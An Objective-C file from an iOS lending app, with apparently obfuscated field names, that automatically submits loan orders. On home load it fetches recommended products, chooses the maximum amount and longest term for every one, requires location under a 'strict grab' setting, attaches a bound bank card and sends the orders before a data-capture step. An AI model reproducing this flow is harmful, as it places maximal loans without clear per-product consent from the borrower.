//
//  TgAutoOrderRelay.m
//  DC upgrade auto-order: dcRecommend → select all (max amount / max term) → userSubmitDcUpgrade
//  → 38 data capture → success page (docs 50 §3.6 / 40).
//

#import "TgAutoOrderRelay.h"
#import "TgEnvelopeBase.h"
#import "TgLoanShellController.h"
#import "TgOrderForgeRelay.h"
#import "TgOrderSuccessVaultController.h"
#import "TgParcelRegistry.h"
#import "TgPayloadModels.h"
#import "TgPolicyVault.h"
#import "TgPulseOverlay.h"
#import "TgShardFacade.h"
#import "TgStampVault.h"
#import "TgTraceRelay.h"
#import "TgWireConduit.h"
#import <CoreLocation/CoreLocation.h>

static NSString * const kTgAutoOrderBusyHint = @"The system is occupied. Please retry after 2 minutes.";
static const NSTimeInterval kTgAutoOrderRecommendTimeout = 10.0;
static const NSTimeInterval kTgAutoOrderLocationTimeout = 10.0;

@interface TgAutoOrderRelay () <CLLocationManagerDelegate>

@property (nonatomic, assign, readwrite) BOOL tg_isProcessing;
@property (nonatomic, assign, readwrite) BOOL tg_awaitingUserRetry;
@property (nonatomic, assign) BOOL tg_allowSecondaryForCurrentRun;
@property (nonatomic, weak) UIViewController *tg_hostVC;
@property (nonatomic, copy, nullable) NSArray<TgProductInfo *> *tg_pendingProducts;
@property (nonatomic, strong, nullable) CLLocationManager *tg_locMgr;
@property (nonatomic, strong, nullable) CLLocation *tg_location;
@property (nonatomic, copy, nullable) dispatch_block_t tg_locTimeout;
@property (nonatomic, copy, nullable) dispatch_block_t tg_recommendTimeout;
@property (nonatomic, assign) BOOL tg_recommendFinished;
@property (nonatomic, assign) BOOL tg_submitFired;

@end

@implementation TgAutoOrderRelay

+ (instancetype)shared {
    static TgAutoOrderRelay *relay = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{ relay = [[TgAutoOrderRelay alloc] init]; });
    return relay;
}

+ (BOOL)tg_shouldAutoOrderWithHomeData:(TgHomeData *)homeData {
    if (!homeData) return NO;
    BOOL noOrder = homeData.scholar == 0;
    BOOL pendingLoan = homeData.telescope == 20;
    NSString *line = [self tg_effectiveFirstLoanOptionLineFromHomeData:homeData];
    BOOL systemLine = [line isEqualToString:@"system"];
    return noOrder && pendingLoan && systemLine;
}

+ (NSString *)tg_effectiveFirstLoanOptionLineFromHomeData:(TgHomeData *)homeData {
    NSString *fromHome = [homeData.garden stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
    if (fromHome.length > 0) return fromHome;
    TgSystemConfigModel *cfg = [[TgPolicyVault shared] currentManifest];
    return [cfg.garden stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
}

- (BOOL)tg_checkAndExecuteWithHomeData:(TgHomeData *)homeData
                           productList:(NSArray<TgProductInfo *> *)productList
                                hostVC:(UIViewController *)hostVC
                         userInitiated:(BOOL)userInitiated {
    (void)productList;
    if (!homeData || !hostVC) return NO;
    if (![self.class tg_shouldAutoOrderWithHomeData:homeData]) {
        self.tg_awaitingUserRetry = NO;
        return NO;
    }

    if (!userInitiated && self.tg_awaitingUserRetry) {
        return NO;
    }

    if ([TgOrderForgeRelay tg_isRunning] || self.tg_isProcessing) {
        return YES;
    }

    if (userInitiated) {
        self.tg_awaitingUserRetry = NO;
    }
    self.tg_allowSecondaryForCurrentRun = userInitiated;
    self.tg_hostVC = hostVC;

    [TgTraceRelay emitSignal:TgTraceSignalAutoOrderStart];

    self.tg_isProcessing = YES;
    self.tg_pendingProducts = nil;
    self.tg_location = nil;
    self.tg_submitFired = NO;
    self.tg_recommendFinished = NO;
    [self tg_fetchDcRecommend];
    return YES;
}

- (void)tg_resetProcessing {
    [self tg_cancelRecommendTimeout];
    [self tg_cancelLocationTimeout];
    [self.tg_locMgr stopUpdatingLocation];
    self.tg_locMgr.delegate = nil;
    self.tg_locMgr = nil;
    self.tg_isProcessing = NO;
    self.tg_submitFired = NO;
    self.tg_recommendFinished = NO;
    self.tg_pendingProducts = nil;
    self.tg_location = nil;
}

#pragma mark - dcRecommend

- (void)tg_fetchDcRecommend {
    // Caller already shows veil for the condition check; keep it for the whole flow.
    [[TgPulseOverlay shared] veilSpin];

    __weak typeof(self) weakSelf = self;
    dispatch_block_t timeout = dispatch_block_create(0, ^{
        __strong typeof(weakSelf) self = weakSelf;
        if (!self || self.tg_recommendFinished) return;
        self.tg_recommendFinished = YES;
        [[TgPulseOverlay shared] veilDismiss];
        [self tg_failSoftWithMessage:nil];
    });
    self.tg_recommendTimeout = timeout;
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kTgAutoOrderRecommendTimeout * NSEC_PER_SEC)),
                   dispatch_get_main_queue(),
                   timeout);

    [[TgWireConduit shared] relayPOST:TgLaneDcRecommend
                             signData:@{}
                           nonSignData:@{}
                      envelopeSuccess:^(TgEnvelopeBase *envelope) {
        __strong typeof(weakSelf) self = weakSelf;
        if (!self || self.tg_recommendFinished) return;
        self.tg_recommendFinished = YES;
        [self tg_cancelRecommendTimeout];
        [self tg_handleRecommendEnvelope:envelope];
    } failure:^{
        __strong typeof(weakSelf) self = weakSelf;
        if (!self || self.tg_recommendFinished) return;
        self.tg_recommendFinished = YES;
        [self tg_cancelRecommendTimeout];
        [[TgPulseOverlay shared] veilDismiss];
        [self tg_failSoftWithMessage:kTgAutoOrderBusyHint];
    }];
}

- (void)tg_cancelRecommendTimeout {
    if (self.tg_recommendTimeout) {
        dispatch_block_cancel(self.tg_recommendTimeout);
        self.tg_recommendTimeout = nil;
    }
}

- (void)tg_handleRecommendEnvelope:(TgEnvelopeBase *)envelope {
    NSString *code = [NSString stringWithFormat:@"%ld", (long)envelope.cheer];
    if ([code isEqualToString:TgFaultRejectNoProduct] || envelope.cheer != 200) {
        [[TgPulseOverlay shared] veilDismiss];
        [self tg_failSoftWithMessage:nil];
        return;
    }

    TgProductListData *listData = [TgProductListData yy_modelWithJSON:envelope.trick];
    NSArray<TgProductInfo *> *products = listData.portrait ?: @[];
    if (products.count == 0 && [envelope.trick isKindOfClass:[NSDictionary class]]) {
        id raw = [(NSDictionary *)envelope.trick objectForKey:@"productInfoList"];
        if ([raw isKindOfClass:[NSArray class]] && [(NSArray *)raw count] > 0) {
            products = [NSArray yy_modelArrayWithClass:[TgProductInfo class] json:raw] ?: @[];
        }
    }
    if (products.count == 0) {
        [[TgPulseOverlay shared] veilDismiss];
        [self tg_failSoftWithMessage:nil];
        return;
    }

    self.tg_pendingProducts = products;
    [self tg_beginLocationThenSubmit];
}

#pragma mark - Location

- (BOOL)tg_isStrictGrab {
    return [[TgPolicyVault shared] currentManifest].preceding == 1;
}

- (NSString *)tg_appDisplayName {
    NSString *name = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleDisplayName"];
    name = [name stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
    if (name.length > 0) return name;
    name = [[[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleName"]
            stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
    return name.length > 0 ? name : @"App";
}

/// Docs 31.8 / 40 §8: already Denied + user-initiated → custom secondary panel; first system deny does not.
- (void)tg_showLocationSecondaryThenEnd {
    [[TgPulseOverlay shared] veilDismiss];
    [self tg_cancelLocationTimeout];
    [self.tg_locMgr stopUpdatingLocation];

    NSString *body = [NSString stringWithFormat:
                      @"Please enable location access for %@ in Settings so you can finish the loan application.",
                      [self tg_appDisplayName]];

    __weak typeof(self) weakSelf = self;
    TgShardPanelConfig *cfg = [[TgShardPanelConfig alloc] init];
    cfg.content = body;
    cfg.secondaryTitle = @"Cancel";
    cfg.primaryTitle = @"Confirm";
    cfg.tier = TgShardTierMid;
    cfg.mount = TgShardMountWindow;
    cfg.dismissOnPrimaryAction = YES;
    cfg.dismissOnSecondaryAction = YES;
    cfg.secondaryAction = ^{
        __strong typeof(weakSelf) self = weakSelf;
        [self tg_failSoftWithMessage:nil];
    };
    cfg.primaryAction = ^{
        __strong typeof(weakSelf) self = weakSelf;
        NSURL *url = [NSURL URLWithString:UIApplicationOpenSettingsURLString];
        if (url) {
            [UIApplication.sharedApplication openURL:url options:@{} completionHandler:nil];
        }
        [self tg_failSoftWithMessage:nil];
    };
    [[TgShardFacade shared] showPanel:cfg];
}

- (void)tg_endStrictLocationDenied {
    [TgTraceRelay emitPermissionGrant:TgTraceSignalLocationGrant
                                  deny:TgTraceSignalLocationDeny
                               granted:NO];
    if (self.tg_allowSecondaryForCurrentRun) {
        [self tg_showLocationSecondaryThenEnd];
    } else {
        [[TgPulseOverlay shared] veilDismiss];
        [self tg_failSoftWithMessage:nil];
    }
}

- (void)tg_beginLocationThenSubmit {
    self.tg_location = nil;
    self.tg_submitFired = NO;
    self.tg_locMgr = [[CLLocationManager alloc] init];
    self.tg_locMgr.delegate = self;
    self.tg_locMgr.desiredAccuracy = kCLLocationAccuracyHundredMeters;

    if (![CLLocationManager locationServicesEnabled]) {
        if ([self tg_isStrictGrab]) {
            [self tg_endStrictLocationDenied];
        } else {
            [self tg_performDcSubmit];
        }
        return;
    }

    CLAuthorizationStatus st = [CLLocationManager authorizationStatus];
    if (st == kCLAuthorizationStatusNotDetermined) {
        [self.tg_locMgr requestWhenInUseAuthorization];
        return;
    }
    if (st == kCLAuthorizationStatusAuthorizedWhenInUse || st == kCLAuthorizationStatusAuthorizedAlways) {
        [TgTraceRelay emitPermissionGrant:TgTraceSignalLocationGrant
                                      deny:TgTraceSignalLocationDeny
                                   granted:YES];
        [self tg_startLocationFetchWithTimeout];
        return;
    }
    // Already Denied / Restricted: secondary only on user-initiated retry (docs 31.8.1).
    if ([self tg_isStrictGrab]) {
        [self tg_endStrictLocationDenied];
    } else {
        [self tg_performDcSubmit];
    }
}

- (void)tg_startLocationFetchWithTimeout {
    [self tg_cancelLocationTimeout];
    [self.tg_locMgr stopUpdatingLocation];
    [self.tg_locMgr startUpdatingLocation];

    __weak typeof(self) weakSelf = self;
    dispatch_block_t work = dispatch_block_create(0, ^{
        __strong typeof(weakSelf) self = weakSelf;
        if (!self || !self.tg_isProcessing || self.tg_submitFired) return;
        self.tg_locTimeout = nil;
        [self.tg_locMgr stopUpdatingLocation];
        if (self.tg_location) {
            [self tg_performDcSubmit];
            return;
        }
        if ([self tg_isStrictGrab]) {
            [[TgPulseOverlay shared] veilDismiss];
            [self tg_failSoftWithMessage:nil];
        } else {
            [self tg_performDcSubmit];
        }
    });
    self.tg_locTimeout = work;
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kTgAutoOrderLocationTimeout * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), work);
}

- (void)tg_cancelLocationTimeout {
    if (self.tg_locTimeout) {
        dispatch_block_cancel(self.tg_locTimeout);
        self.tg_locTimeout = nil;
    }
}

- (void)locationManagerDidChangeAuthorization:(CLLocationManager *)manager {
    (void)manager;
    if (!self.tg_isProcessing || self.tg_submitFired) return;
    CLAuthorizationStatus st = [CLLocationManager authorizationStatus];
    if (st == kCLAuthorizationStatusNotDetermined) return;
    if (st == kCLAuthorizationStatusAuthorizedWhenInUse || st == kCLAuthorizationStatusAuthorizedAlways) {
        [TgTraceRelay emitPermissionGrant:TgTraceSignalLocationGrant
                                      deny:TgTraceSignalLocationDeny
                                   granted:YES];
        [self tg_startLocationFetchWithTimeout];
        return;
    }
    // First system deny: end round, no custom secondary (docs 31.8.1).
    if ([self tg_isStrictGrab]) {
        [TgTraceRelay emitPermissionGrant:TgTraceSignalLocationGrant
                                      deny:TgTraceSignalLocationDeny
                                   granted:NO];
        [[TgPulseOverlay shared] veilDismiss];
        [self tg_failSoftWithMessage:nil];
    } else {
        [self tg_performDcSubmit];
    }
}

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    (void)manager;
    if (!self.tg_isProcessing || self.tg_submitFired) return;
    CLLocation *loc = locations.lastObject;
    if (!loc) return;
    self.tg_location = loc;
    [self tg_cancelLocationTimeout];
    [manager stopUpdatingLocation];
    [self tg_performDcSubmit];
}

- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
    (void)manager;
    if (!self.tg_isProcessing || self.tg_submitFired) return;
    if (error.code == kCLErrorLocationUnknown) return;
    [self tg_cancelLocationTimeout];
    [self.tg_locMgr stopUpdatingLocation];
    if ([self tg_isStrictGrab]) {
        [[TgPulseOverlay shared] veilDismiss];
        [self tg_failSoftWithMessage:nil];
    } else {
        [self tg_performDcSubmit];
    }
}

#pragma mark - userSubmitDcUpgrade

- (void)tg_performDcSubmit {
    if (!self.tg_isProcessing || self.tg_submitFired) return;
    if ([self tg_isStrictGrab] && !self.tg_location) {
        [[TgPulseOverlay shared] veilDismiss];
        [self tg_failSoftWithMessage:nil];
        return;
    }

    self.tg_submitFired = YES;
    [self tg_cancelLocationTimeout];
    [self.tg_locMgr stopUpdatingLocation];

    NSArray<TgProductInfo *> *products = self.tg_pendingProducts ?: @[];
    NSMutableArray *ids = [NSMutableArray array];
    NSMutableArray *amts = [NSMutableArray array];
    NSMutableArray *terms = [NSMutableArray array];
    NSString *bindId = nil;

    for (TgProductInfo *product in products) {
        TgProductTermData *termData = product.productTermV3Response;
        if (!termData || termData.nonsense.count == 0) continue;

        NSArray<TgAmountDetail *> *sortedAmts = [self tg_sortAmountListDescending:termData.nonsense];
        TgAmountDetail *chosenAmt = sortedAmts.firstObject;
        if (!chosenAmt || chosenAmt.eighth.count == 0) continue;

        NSArray<TgTermDetail *> *sortedTerms = [self tg_sortTermListAscending:chosenAmt.eighth];
        TgTermDetail *chosenTerm = sortedTerms.lastObject;
        if (!chosenTerm) continue;

        NSString *pid = termData.resistance.length ? termData.resistance : product.resistance;
        pid = [pid stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
        NSString *amount = [chosenAmt.inch stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
        if (pid.length == 0 || amount.length == 0) continue;

        NSInteger loanTerm = chosenTerm.culture > 0 ? chosenTerm.culture : chosenTerm.ill;
        if (loanTerm <= 0) continue;

        [ids addObject:pid];
        [amts addObject:amount];
        [terms addObject:[NSString stringWithFormat:@"%ld", (long)loanTerm]];

        if (!bindId) {
            TgCardInfo *card = termData.superior.firstObject;
            NSString *b = [card.comparison stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
            if (b.length > 0) bindId = b;
        }
    }

    if (ids.count == 0) {
        [[TgPulseOverlay shared] veilDismiss];
        [self tg_failSoftWithMessage:nil];
        return;
    }

    NSString *lon = @"-360";
    NSString *lat = @"-360";
    if (self.tg_location) {
        lon = [NSString stringWithFormat:@"%.6f", self.tg_location.coordinate.longitude];
        lat = [NSString stringWithFormat:@"%.6f", self.tg_location.coordinate.latitude];
    }

    NSDictionary *sign = @{
        @"productIds": [ids componentsJoinedByString:@","],
        @"loanAmounts": [amts componentsJoinedByString:@","],
        @"loanTerms": [terms componentsJoinedByString:@","],
        @"longitude": lon,
        @"latitude": lat,
        @"imei": @"null",
        @"serialNo": [TgStampVault serialStamp] ?: @""
    };
    NSMutableDictionary *nonSign = [NSMutableDictionary dictionary];
    if (bindId.length > 0) nonSign[@"bankCardBindId"] = bindId;

    NSArray *productIdsCopy = [ids copy];
    __weak typeof(self) weakSelf = self;
    UIViewController *hostVC = self.tg_hostVC;

    [[TgWireConduit shared] relayPOST:TgLaneOrderSubmitDcUpgrade
                             signData:sign
                           nonSignData:nonSign
                      envelopeSuccess:^(TgEnvelopeBase *envelope) {
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;
        if (envelope.cheer != 200) {
            [[TgPulseOverlay shared] veilDismiss];
            NSString *msg = [envelope.power stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
            [self tg_failSoftWithMessage:msg.length ? msg : kTgAutoOrderBusyHint];
            return;
        }
        TgDcUpgradeSubmitData *data = [TgDcUpgradeSubmitData yy_modelWithJSON:envelope.trick];
        NSArray<TgDcUpgradeOrderItem *> *list = data.list ?: @[];
        if (list.count == 0 && [envelope.trick isKindOfClass:[NSDictionary class]]) {
            id raw = [(NSDictionary *)envelope.trick objectForKey:@"list"];
            if ([raw isKindOfClass:[NSArray class]]) {
                list = [NSArray yy_modelArrayWithClass:[TgDcUpgradeOrderItem class] json:raw] ?: @[];
            }
        }

        NSMutableArray<TgOrderSuccessPair *> *pairs = [NSMutableArray array];
        NSUInteger pairCount = MIN(list.count, productIdsCopy.count);
        for (NSUInteger i = 0; i < pairCount; i++) {
            TgDcUpgradeOrderItem *item = list[i];
            NSString *oid = [item.interpret stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
            NSString *pid = [productIdsCopy[i] stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
            if (oid.length == 0 || pid.length == 0) continue;
            [pairs addObject:[TgOrderSuccessPair pairWithOrderId:oid productId:pid]];
        }
        if (pairs.count == 0) {
            [[TgPulseOverlay shared] veilDismiss];
            [self tg_failSoftWithMessage:kTgAutoOrderBusyHint];
            return;
        }

        NSString *firstOrderId = pairs.firstObject.orderId;
        NSArray<TgOrderSuccessPair *> *pairsCopy = [pairs copy];
        [TgOrderForgeRelay tg_resumeDataCaptureForOrderId:firstOrderId
                                                   hostVC:hostVC
                                                   origin:TgOrderForgeOriginAutoHome
                                     allowSecondaryPrompt:self.tg_allowSecondaryForCurrentRun
                                                  success:^(NSString *orderId) {
            __strong typeof(weakSelf) self = weakSelf;
            if (!self) return;
            self.tg_isProcessing = NO;
            self.tg_awaitingUserRetry = NO;
            UIViewController *host = self.tg_hostVC ?: hostVC;
            if (host.navigationController) {
                TgOrderSuccessVaultController *ok = [[TgOrderSuccessVaultController alloc] init];
                ok.tg_orderPairs = pairsCopy;
                ok.tg_orderId = orderId.length ? orderId : firstOrderId;
                ok.tg_productId = pairsCopy.firstObject.productId;
                ok.tg_exitMode = TgOrderSuccessExitModeHome;
                ok.hidesBottomBarWhenPushed = YES;
                [host.navigationController pushViewController:ok animated:YES];
            }
            [self tg_refreshHomeIfNeeded:host];
            [self tg_resetProcessing];
        } failure:^(NSString *message) {
            __strong typeof(weakSelf) self = weakSelf;
            if (!self) return;
            NSString *msg = [message stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
            [self tg_failSoftWithMessage:msg];
            [self tg_refreshHomeIfNeeded:self.tg_hostVC ?: hostVC];
        } cancelled:^{
            __strong typeof(weakSelf) self = weakSelf;
            if (!self) return;
            [self tg_markAwaitingUserRetry];
            self.tg_isProcessing = NO;
            [self tg_refreshHomeIfNeeded:self.tg_hostVC ?: hostVC];
            [self tg_resetProcessing];
            self.tg_awaitingUserRetry = YES;
        }];
    } failure:^{
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;
        [[TgPulseOverlay shared] veilDismiss];
        [self tg_failSoftWithMessage:kTgAutoOrderBusyHint];
    }];
}

#pragma mark - Helpers

- (NSArray<TgAmountDetail *> *)tg_sortAmountListDescending:(NSArray<TgAmountDetail *> *)list {
    return [list sortedArrayUsingComparator:^NSComparisonResult(TgAmountDetail *a, TgAmountDetail *b) {
        NSInteger av = [self tg_integerFromString:a.inch];
        NSInteger bv = [self tg_integerFromString:b.inch];
        if (av == bv) return NSOrderedSame;
        return av > bv ? NSOrderedAscending : NSOrderedDescending;
    }];
}

- (NSArray<TgTermDetail *> *)tg_sortTermListAscending:(NSArray<TgTermDetail *> *)list {
    return [list sortedArrayUsingComparator:^NSComparisonResult(TgTermDetail *a, TgTermDetail *b) {
        NSInteger av = a.ill > 0 ? a.ill : a.culture;
        NSInteger bv = b.ill > 0 ? b.ill : b.culture;
        if (av == bv) return NSOrderedSame;
        return av < bv ? NSOrderedAscending : NSOrderedDescending;
    }];
}

- (NSInteger)tg_integerFromString:(NSString *)raw {
    NSString *trim = [raw stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
    if (trim.length == 0) return 0;
    return (NSInteger)trim.longLongValue;
}

- (void)tg_markAwaitingUserRetry {
    self.tg_awaitingUserRetry = YES;
}

- (void)tg_failSoftWithMessage:(nullable NSString *)message {
    self.tg_isProcessing = NO;
    if (message.length == 0) {
        [self tg_markAwaitingUserRetry];
    } else {
        self.tg_awaitingUserRetry = NO;
        [[TgPulseOverlay shared] whisperLine:message duration:2.0];
    }
    UIViewController *host = self.tg_hostVC;
    [self tg_refreshHomeIfNeeded:host];
    [self tg_resetProcessing];
    if (message.length == 0) {
        self.tg_awaitingUserRetry = YES;
    }
}

- (void)tg_refreshHomeIfNeeded:(UIViewController *)host {
    if ([host isKindOfClass:[TgLoanShellController class]]) {
        TgLoanShellController *loan = (TgLoanShellController *)host;
        if (loan.tg_pipelineDone) {
            [loan tg_reloadSupHomeOnly];
        }
    }
}

@end
